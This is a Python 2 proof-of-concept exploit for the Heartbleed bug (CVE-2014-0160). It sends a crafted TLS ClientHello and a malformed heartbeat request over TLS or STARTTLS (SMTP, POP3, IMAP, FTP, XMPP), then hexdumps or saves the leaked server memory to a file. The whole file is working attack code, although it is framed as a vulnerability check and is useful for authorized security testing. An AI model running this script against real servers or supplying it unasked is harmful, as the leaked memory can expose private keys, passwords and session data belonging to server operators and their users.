#!/usr/bin/env python2
"""
Author: takeshix <takeshix@adversec.com>
PoC code for CVE-2014-0160. Original PoC by Jared Stafford (jspenguin@jspenguin.org).

Supportes all versions of TLS and has STARTTLS support for SMTP,POP3,IMAP,FTP and XMPP.
"""

import sys,struct,socket
from argparse import ArgumentParser

tls_versions = {0x01:'TLSv1.0',0x02:'TLSv1.1',0x03:'TLSv1.2'}

def info(msg):
    print '[+] {}'.format(msg)

def error(msg):
    print '[-] {}'.format(msg)
    sys.exit(0)

def debug(msg):
    if opts.debug: print '[*] {}'.format(msg)

def parse_cl():
    global opts
    parser = ArgumentParser(description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
    parser.add_argument('host', help='IP or hostname of target system')
    parser.add_argument('-p', '--port', metavar='Port', type=int, default=443, help='TCP port to test (default: 443)')
    parser.add_argument('-f', '--file', metavar='File', help='Dump leaked memory into outfile')
    parser.add_argument('-s', '--starttls', metavar='smtp|pop3|imap|ftp|xmpp', default=False, help='Check STARTTLS')
    parser.add_argument('-d', '--debug', action='store_true', default=False, help='Enable debug output')
    opts = parser.parse_args()

def hex2bin(arr):
    return ''.join('{:02x}'.format(x) for x in arr).decode('hex')

def build_client_hello(tls_ver):
    client_hello = [
# TLS header ( 5 bytes)
0x16,               # Content type (0x16 for handshake)
0x03, tls_ver,         # TLS Version
0x00, 0xdc,         # Length
# Handshake header
0x01,               # Type (0x01 for ClientHello)
0x00, 0x00, 0xd8,   # Length
0x03, tls_ver,         # TLS Version
# Random (32 byte)
0x53, 0x43, 0x5b, 0x90, 0x9d, 0x9b, 0x72, 0x0b,
0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97,
0xcf, 0xbd, 0x39, 0x04, 0xcc, 0x16, 0x0a, 0x85,
0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde,
0x00,               # Session ID length
0x00, 0x66,         # Cipher suites length
# Cipher suites (51 suites)
0xc0, 0x14, 0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21,
0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87,
0xc0, 0x0f, 0xc0, 0x05, 0x00, 0x35, 0x00, 0x84,
0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b,
0x00, 0x16, 0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03,
0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f,
0xc0, 0x1e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x9a,
0x00, 0x99, 0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e,
0xc0, 0x04, 0x00, 0x2f, 0x00, 0x96, 0x00, 0x41,
0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02,
0x00, 0x05, 0x00, 0x04, 0x00, 0x15, 0x00, 0x12,
0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08,
0x00, 0x06, 0x00, 0x03, 0x00, 0xff,
0x01,               # Compression methods length
0x00,               # Compression method (0x00 for NULL)
0x00, 0x49,         # Extensions length
# Extension: ec_point_formats
0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,
# Extension: elliptic_curves
0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e,
0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c,
0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16,
0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07,
0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05,
0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02,
0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11,
# Extension: SessionTicket TLS
0x00, 0x23, 0x00, 0x00,
# Extension: Heartbeat
0x00, 0x0f, 0x00, 0x01, 0x01
    ]
    return client_hello

def build_heartbeat(tls_ver):
    heartbeat = [
0x18,       # Content Type (Heartbeat)
0x03, tls_ver,  # TLS version
0x00, 0x03,  # Length
# Payload
0x01,       # Type (Request)
0x40, 0x00  # Payload length
    ] 
    return heartbeat

def hexdump(s):
    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
        print '  %04x: %-48s %s' % (b, hxdat, pdat)

def rcv_tls_record(s):
    try:
        tls_header = s.recv(5)
        if not tls_header:
            error('Unexpected EOF (header)')            
        typ,ver,length = struct.unpack('>BHH',tls_header)
        message = ''
        while len(message) != length:
            message += s.recv(length-len(message))
        if not message:
            error('Unexpected EOF (message)')
        debug('Received message: type = {}, version = {}, length = {}'.format(typ,hex(ver),length,))
        return typ,ver,message
    except Exception as e:
        return None,None,None

if __name__ == '__main__':
    parse_cl()

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        info('Connecting...')
        s.connect((opts.host, opts.port))
    except Exception as e:
        error(str(e))

    if opts.starttls:
        BUFSIZE=4096
        if opts.starttls == 'smtp':
            re = s.recv(BUFSIZE)
            debug(re)
            s.send('ehlo starttlstest\r\n')
            re = s.recv(BUFSIZE)
            debug(re)
            if not 'STARTTLS' in re:
                debug(re)
                error('STARTTLS not supported')
            s.send('starttls\r\n')
            re = s.recv(BUFSIZE)
        elif opts.starttls == 'pop3':
            s.recv(BUFSIZE)
            s.send('STLS\r\n')
            s.recv(BUFSIZE)
        elif opts.starttls == 'imap':
            s.recv(BUFSIZE)
            s.send('STARTTLS\r\n')
            s.recv(BUFSIZE)
        elif opts.starttls == 'ftp':
            s.recv(BUFSIZE)
            s.send('AUTH TLS\r\n')
            s.recv(BUFSIZE)
        elif opts.starttls == 'xmpp':
            s.send("<stream:stream xmlns:stream='http://etherx.jabber.org/streams' xmlns='jabber:client' to='%s' version='1.0'\n")
            s.recv(BUFSIZE)
    
    supported = False
    for num,tlsver in tls_versions.items():
        info('Sending ClientHello for {}'.format(tlsver))
        s.send(hex2bin(build_client_hello(num)))
        info('Waiting for Server Hello...')
        while True:
            typ,ver,message = rcv_tls_record(s)
            if not typ:
                error('Server closed connection without sending ServerHello for {}'.format(tlsver))
                continue
            if typ is 22 and ord(message[0]) is 0x0E:
                info('Reveiced ServerHello for {}'.format(tlsver))
                supported = num
                break
        if supported: break

    if not supported:
        error('No TLS version is supported')

    info('Sending heartbeat request...')
    s.send(hex2bin(build_heartbeat(supported)))

    while True:
        typ,ver,message = rcv_tls_record(s)
        if not typ:
            error('No heartbeat response received, server likely not vulnerable')
        if typ is 24:
            info('Received heartbeat response:')
            if len(message) > 3:
                if opts.file:
                    try:    
                        f = open(opts.file,'w')
                        f.write(message)
                        f.flush()
                        f.close()
                        debug('Written leaked memory into {}'.format(opts.file))
                    except Exception as e:
                        error(str(e))
                else:
                    hexdump(message)
                info('Server is vulnerable!')
                sys.exit(0)
            else:
                error('Server processed malformed heartbeat, but did not return any extra data.')
        elif typ is 21:
            error('Received alert')
